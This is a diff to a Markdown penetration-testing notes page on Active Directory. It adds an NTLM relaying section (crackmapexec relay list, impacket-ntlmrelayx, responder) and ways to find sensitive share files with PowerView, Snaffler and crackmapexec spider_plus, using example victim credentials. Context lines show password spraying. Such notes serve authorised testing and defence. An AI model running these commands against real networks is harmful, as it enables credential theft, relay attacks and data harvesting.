@@ -101,7 +101,16 @@ sudo docker run -v ${PWD}:/bloodhound-data -it bloodhound
             * Although the commands in the reference work, I found that it was easier to modify permissions and other actions (reset user password) using RSAT.
             * If you're Windows attacking VM is connected to the network, just [run mmc as a domain user](./Initial_Foothold.html#rsat) (provided you already have the domain user's credentials). 
             
-___
+---
+## NTLM Relaying
+* Basic NTLM Relay
+    * Gather NTLM Relay list using crackmapexec
+        * `crackmapexec smb --gen-relay-list relay_list.txt company_internal_subnets.txt`
+```bash
+sudo impacket-ntlmrelayx -socks -smb2support -of output.txt -tf ./relay_list.txt -c ipconfig
+sudo responder -I eth1 -Pvd
+```
+---
 ## General Attack methods
 * Methods [^5][^6]
      * NTLM Relay[^18]
@@ -193,11 +202,23 @@ Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Spring2017
 ```
 
-### Find interesting Domain Share Files[^12]
-```powershell
-Find-InterestingDomainShareFile
-```
+---
 
+## Find interesting Domain Share Files[^12]
+* Find-InterestingDomainShareFile
+    ```powershell
+    Find-InterestingDomainShareFile
+    ```
+* Snaffler
+    ```batch
+    runas /netonly /user:domain.local\victim01 cmd.exe
+    snaffler.exe -s -o snaffler_.log
+    ```
+* Crackmapexec
+    * Also refer to [this](./Post_Exploitation.html#looking-for-files-in-the-domain)
+    ```bash
+    crackmapexec smb -d domain.local -u victim01 -p P@ssw0rd -M spider_plus
+    ```
 
 ---
 ## Direct Attacks to the Domain Controller
@@ -313,3 +334,4 @@ crackmapexec smb /home/kali/Scope/writable_shares.txt -d domain.local -u user01 
 [^17]: [Github - dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
 [^18]: [TrustedSec - Comprehensive Guide on NTLM Relaying 2022](https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/)
 [^19]: [Readthedocs - Bloodhound](https://bloodhound.readthedocs.io/en/latest/installation/linux.html)
+[^20]: [Twitter - mpgn](https://twitter.com/mpgn_x64/status/1508781519430692864)
